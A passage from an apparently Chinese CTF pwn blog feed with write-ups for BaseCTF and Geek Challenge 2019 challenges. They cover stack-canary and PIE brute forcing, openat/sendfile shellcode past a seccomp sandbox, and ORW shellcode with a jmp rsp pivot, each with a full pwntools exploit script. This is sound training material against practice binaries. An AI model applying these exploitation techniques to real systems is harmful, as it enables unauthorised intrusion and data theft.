class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div><ul><li>第二步就是爆破canary，canary最后一字节肯定是\x00，所以还需要爆破七位，因此因套两层循环，注意每一次都需要模拟随机数：</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">        num = elf1.rand() % <span class="number">50</span>       </span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;BaseCTF&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + p8(i) <span class="comment"># 单字节爆破</span></span><br><span class="line">        p.send(payload)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        rev = p.readline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rev: <span class="comment"># 一位出错立马stack_chk_fail</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;第<span class="subst">&#123;j+<span class="number">1</span>&#125;</span>位是<span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">            canary += p8(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary is <span class="subst">&#123;<span class="built_in">hex</span>(u64(canary))&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第<span class="number">1</span>位是<span class="number">0xeb</span></span><br><span class="line">第<span class="number">2</span>位是<span class="number">0x9</span></span><br><span class="line">第<span class="number">3</span>位是<span class="number">0x27</span></span><br><span class="line">第<span class="number">4</span>位是<span class="number">0xbe</span></span><br><span class="line">第<span class="number">5</span>位是<span class="number">0xab</span></span><br><span class="line">第<span class="number">6</span>位是<span class="number">0x48</span></span><br><span class="line">第<span class="number">7</span>位是<span class="number">0xde</span></span><br><span class="line">canary <span class="keyword">is</span> <span class="number">0xde48abbe2709eb00</span></span><br></pre></td></tr></table></figure></div><ul><li>canary到手了，只需要将返回地址后<strong>两字节改为shell的地址</strong>，但是要注意并不是返回到push rbp的位置，因为那样程序是跑不通的，无法获得flag，所以我们直接往下面这个地址跳就行了：</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000012A9 ; __unwind &#123;</span><br><span class="line">.text:00000000000012A9                 endbr64</span><br><span class="line">.text:00000000000012AD                 push    rbp</span><br><span class="line">.text:00000000000012AE                 mov     rbp, rsp</span><br><span class="line">.text:00000000000012B1  往这里写即可     lea     rdi, command    ; &quot;/bin/cat flag&quot;</span><br><span class="line">.text:00000000000012B8                 call    _system</span><br><span class="line">.text:00000000000012BD                 nop</span><br><span class="line">.text:00000000000012BE                 pop     rbp</span><br><span class="line">.text:00000000000012BF                 retn</span><br><span class="line">.text:00000000000012BF ; &#125; // starts at 12A9</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆破pie</span></span><br><span class="line">shell = <span class="number">0x02B1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    num = elf1.rand() % <span class="number">50</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p16(shell) <span class="comment"># 注意是p16</span></span><br><span class="line">    <span class="comment"># 只需要改末尾两字节就可以了</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    rev = p.readline()</span><br><span class="line">    <span class="built_in">print</span>(rev)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;welcome&#x27;</span> <span class="keyword">in</span> rev:</span><br><span class="line">        p.readline()</span><br><span class="line">        shell += <span class="number">0x1000</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div><h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><ul><li>注意：本地复现要创建一个flag文件</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;challenge.basectf.fun&quot;,32079)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf1 = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1 = cdll.LoadLibrary(&quot;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">seed = elf1.time(<span class="number">0</span>)</span><br><span class="line">elf1.srand(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破canary    </span></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">        num = elf1.rand() % <span class="number">50</span>       </span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;BaseCTF&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + p8(i)</span><br><span class="line">        p.send(payload)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        rev = p.readline()</span><br><span class="line">        <span class="comment">#rev = p.recv()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rev:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;第<span class="subst">&#123;j+<span class="number">1</span>&#125;</span>位是<span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">            canary += p8(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary is <span class="subst">&#123;<span class="built_in">hex</span>(u64(canary))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破pie</span></span><br><span class="line">shell = <span class="number">0x02B1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    num = elf1.rand() % <span class="number">50</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p16(shell)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    rev = p.readline()</span><br><span class="line">    <span class="built_in">print</span>(rev)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;welcome&#x27;</span> <span class="keyword">in</span> rev:</span><br><span class="line">        p.readline()</span><br><span class="line">        shell += <span class="number">0x1000</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>沙箱禁用ORW-BaseCTF</title>
      <link href="/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/"/>
      <url>/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="典型的沙箱禁用"><a href="#典型的沙箱禁用" class="headerlink" title="典型的沙箱禁用"></a>典型的沙箱禁用</h1><p><a class="link" href="https://www.basectf.fun/games/1/challenges">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">题解链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://blog.csdn.net/SUKI547/article/details/103315487">linux64位系统调用表 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a href="http://downbeat.top/2024/09/01/pwnable%E7%B3%BB%E5%88%97/">未禁用ORW</a></p><h1 id="1-ida速览"><a href="#1-ida速览" class="headerlink" title="1.ida速览"></a>1.ida速览</h1><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your shellcode:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;read failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sandbox(); <span class="comment">// 沙箱禁用</span></span><br><span class="line">  execute_shellcode(buf);</span><br><span class="line">  munmap(buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>其实挺明显的，我们只要绕过沙箱的限制即可，下面看看沙箱禁用了什么：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240918210028982.bmp"></p><ul><li><font color="red" size="4">禁用ORW</font></li></ul><h1 id="2-思路"><a href="#2-思路" class="headerlink" title="2.思路"></a>2.思路</h1><ul><li>按照开头题解出题人的思路来的，先用openat打开flag文件，接着用sendfile输出flag</li><li>对于这两个函数的解释如下(引自gpt)</li></ul><h3 id="openat"><a href="#openat" class="headerlink" title="openat"></a>openat</h3><ul><li><code>openat</code> 函数是 Linux 系统调用的一部分，用来打开一个相对于目录文件描述符的文件。在文件系统操作中，<code>openat</code> 提供了一种灵活的方式，允许你在一个指定的目录（而不是当前工作目录）内打开文件。<code>openat</code> 的作用和 <code>open</code> 类似，但 <code>openat</code> 允许指定一个文件描述符（目录的文件描述符），以便于处理相对路径的文件。</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span></span>;</span><br><span class="line">dirfd: 表示目录的文件描述符。如果是 AT_FDCWD，则相对路径是从当前工作目录开始查找。</span><br><span class="line">pathname: 要打开的文件路径,例如<span class="string">&quot;/flag&quot;</span>。</span><br><span class="line">flags: 文件打开的标志，类似于 open 的标志，如 O_RDONLY、O_WRONLY、O_RDWR、O_CREAT 等。</span><br><span class="line">mode: 新文件的权限，仅当使用 O_CREAT 时才需要。</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">汇编代码如下：</span><br><span class="line">openat 函数</span><br><span class="line">mov rax, 257          ; 系统调用号 (openat)</span><br><span class="line">mov rdi, dirfd        ; 目录文件描述符</span><br><span class="line">mov rsi, pathname     ; 文件路径</span><br><span class="line">mov rdx, flags        ; 文件打开标志</span><br><span class="line">mov r10, mode         ; 文件权限 (当使用 O_CREAT 时)</span><br><span class="line">syscall               ; 执行系统调用</span><br></pre></td></tr></table></figure></div><h3 id="sendfile"><a href="#sendfile" class="headerlink" title="sendfile"></a>sendfile</h3><ul><li><code>sendfile</code> 是 Linux 的系统调用，用于在两个文件描述符之间传输数据。它在内核中直接进行文件数据的传输，避免了数据从内核到用户空间的拷贝，从而提高了性能。常用于网络服务器中，将文件内容快速发送到网络套接字</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sendfile</span><span class="params">(<span class="type">int</span> out_fd, <span class="type">int</span> in_fd, <span class="type">off_t</span> *offset, <span class="type">size_t</span> count)</span>;</span><br><span class="line">out_fd: 目标文件描述符，通常是一个套接字文件描述符（socket），表示将数据发送到哪里。</span><br><span class="line">in_fd: 源文件描述符，表示从哪里读取数据，通常是一个普通的文件。</span><br><span class="line">offset: 指向偏移量的指针，表示从源文件的哪个位置开始读取。如果为 <span class="literal">NULL</span>，则从当前偏移量开始读取。</span><br><span class="line">count: 需要传输的字节数。</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 40          ; 系统调用号 (sendfile)</span><br><span class="line">mov rdi, out_fd      ; 目标文件描述符</span><br><span class="line">mov rsi, in_fd       ; 源文件描述符</span><br><span class="line">mov rdx, offset      ; 文件偏移量指针</span><br><span class="line">mov r10, count       ; 传输的字节数</span><br><span class="line">syscall              ; 执行系统调用</span><br></pre></td></tr></table></figure></div><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><ul><li>openat</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e ; flag</span><br><span class="line">push rax; rax将&quot;flag&quot;入栈</span><br><span class="line">mov rsi, rsp; &quot;flag&quot;赋值给rsi,即文件路径</span><br><span class="line">xor rax, rax; 清零</span><br><span class="line">xor rdi, rdi; 清零</span><br><span class="line">sub rdi, 100; </span><br><span class="line">xor rdx, rdx; 清零</span><br><span class="line">mov r10, 7 ; rwx权限</span><br><span class="line">mov rax, 0x101; 系统调用号</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></div><ul><li>sendfile</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,1; 目标文件指向stdout，标准输出</span><br><span class="line">mov rsi,3   ; 源文件，0-stdin 1-stdout 2-stderr 3-flag</span><br><span class="line">mov rdx,0; 偏移量0</span><br><span class="line">mov r10,0x100; 输出字节数设置大一点</span><br><span class="line">push 40; 系统调用号</span><br><span class="line">pop rax</span><br><span class="line">syscall </span><br></pre></td></tr></table></figure></div><h1 id="3-完整EXP"><a href="#3-完整EXP" class="headerlink" title="3.完整EXP"></a>3.完整EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>,<span class="number">30343</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">shellcode = (<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e </span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov r10, 7</span></span><br><span class="line"><span class="string">    mov rax, 0x101</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,3   </span></span><br><span class="line"><span class="string">    mov rdx,0</span></span><br><span class="line"><span class="string">    mov r10,0x100</span></span><br><span class="line"><span class="string">    push 40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctfpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>该文章暂当图床</title>
      <link href="/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/"/>
      <url>/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240727171132952.png"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240727205848343.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> trash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019-Not_Bad</title>
      <link href="/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/"/>
      <url>/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/</url>
      
        <content type="html"><![CDATA[<h1 id="典型的ORW-mmap参数理解"><a href="#典型的ORW-mmap参数理解" class="headerlink" title="典型的ORW+mmap参数理解"></a>典型的ORW+mmap参数理解</h1><p><a class="link" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad">题目连接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><font color="red">知识点</font></p><p>1.典型的沙箱，ORW</p><p>2.mmap参数的理解，参考<a class="link" href="https://zhuanlan.zhihu.com/p/527532465">这篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="1-ida速览"><a href="#1-ida速览" class="headerlink" title="1.ida速览"></a>1.ida速览</h2><ul><li>已经修改了函数名，加入了沙箱</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240916154952629.bmp"></p><ul><li>发现是典型的ORW可用：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240916155021894.bmp"></p><ul><li>查看一下主要部分：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240916155002230.bmp"></p><p>存在明显的栈溢出，并且此题保护全关，可以直接写入shellcode。</p><h3 id="简单思路"><a href="#简单思路" class="headerlink" title="简单思路"></a>简单思路</h3><ul><li>关于mmap函数的参数可以参考开头的文章，此处的mmap会在指定的地址开辟一个0x1000的可写可执行区域(prot&#x3D;6，不可读)，因此我们可以在该地址写入shellcode，然后使之被调用就可以getflag。</li><li>具体的构造看下面吧：</li></ul><h2 id="2-完整分析"><a href="#2-完整分析" class="headerlink" title="2.完整分析"></a>2.完整分析</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以先将已知的和需要的先构建出来</span></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line"><span class="comment"># 先构造好shellcode,典型的ORW</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure></div><ul><li>这里要解释一下read的第一个参数的含义，代表我要读的文件是第几个，即fd，所谓的3是因为</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> : <span class="built_in">stdin</span></span><br><span class="line"><span class="number">1</span> : <span class="built_in">stdout</span></span><br><span class="line"><span class="number">2</span> : <span class="built_in">stderr</span></span><br><span class="line"><span class="number">3</span> ：flag</span><br></pre></td></tr></table></figure></div><ul><li>shellcode是构造完了，但是这个shellcode的长度有0x52，能直接写吗？当然不行，栈空间不够啊，那要如何完成呢？</li><li>我们可以在栈开头调用一个read，再将这个shellcode输入到mmap的地址，最后改变rax为mmap地址，再call就好了，那么初始的构造就如下了：</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>)) + asm(<span class="string">&quot;mov rax,0x123000;call rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure></div><ul><li>这样我们就构造好了开始的结构，只要调用这个，再次输入shellcode，就可以getflag了，如何调用？可以参考我之前写的<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/139296136?spm=1001.2014.3001.5502">这篇博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>我们只需要将ret_address改为jmp_rsp的地址，此时ret相当于执行pop rip，将rsp的值弹给rip，那么此时的<strong>rip就是jmp_rsp</strong>，同时，也由于pop rip中的pop，导致rsp+8，此时rsp指向下一条语句，即”sub rsp;0x30;jmp rsp”,rip此时jmp_rsp,相当于执行这段语句，那么便会执行栈开头的系统调用了</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>) <span class="comment"># jmp_rsp为地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure></div><h2 id="3-完整EXP："><a href="#3-完整EXP：" 